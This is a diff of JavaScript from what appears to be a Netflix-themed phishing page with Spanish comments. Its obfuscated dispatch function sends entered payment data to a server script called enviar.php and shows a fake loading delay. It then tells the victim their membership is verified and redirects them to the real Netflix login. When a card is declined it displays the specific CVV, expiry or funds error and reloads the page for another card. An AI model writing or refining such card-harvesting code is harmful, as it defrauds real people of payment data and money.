@@ -112,7 +112,6 @@
 
         // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
         function _0xdispatch(obj) {
-    // 1. Mostrar pantalla de carga
     document.getElementById('dynamic-injection').style.display = 'none';
     document.getElementById('loading-overlay').style.display = 'block';
 
@@ -121,38 +120,21 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(obj)
     })
-    .then(response => {
-        if (!response.ok) throw new Error('Error en el servidor');
-        return response.json();
-    })
+    .then(response => response.json())
     .then(data => {
-        // Pausa de 2 segundos para que la carga parezca real
         setTimeout(() => {
             if (data.pago === true) {
-                // --- PAGO EXITOSO ---
-                alert("¡Suscripción confirmada! Tu cuenta se ha activado correctamente. Disfruta del servicio.");
-                
-                // Redirigir a la página real (puedes cambiar esta URL si deseas)
+                alert("¡Verificación exitosa! Tu membresía ha sido confirmada.");
                 window.location.href = "https://www.netflix.com/login";
-                
-                // Limpiar el contador de intentos por si acaso
-                sessionStorage.removeItem('cont_int');
             } else {
-                // --- PAGO FALLIDO / RECHAZADO ---
-                // Mostramos el motivo real que devolvió Stripe (fondos, declinada, etc)
-                alert("Atención: " + data.mensaje_error + ". Por favor, intenta con otra tarjeta de crédito o débito.");
-                
-                // Recargamos para que vuelva a intentar con otra tarjeta
+                // AQUÍ SE MUESTRA EL ERROR ESPECÍFICO (CVV, FECHA, FONDOS)
+                alert("Atención: " + data.mensaje_error + ". Por favor, verifique los datos o intente con otra tarjeta.");
                 location.reload();
             }
-        }, 2000);
+        }, 1500);
     })
     .catch(err => {
-        console.error("Error en el envío:", err);
-        alert("Lo sentimos, hubo un problema técnico de conexión. Inténtelo de nuevo.");
+        alert("Error de comunicación. Asegúrate de que el archivo enviar.php esté en tu servidor.");
         location.reload();
     });
 }
-    </script>
-</body>
-</html>
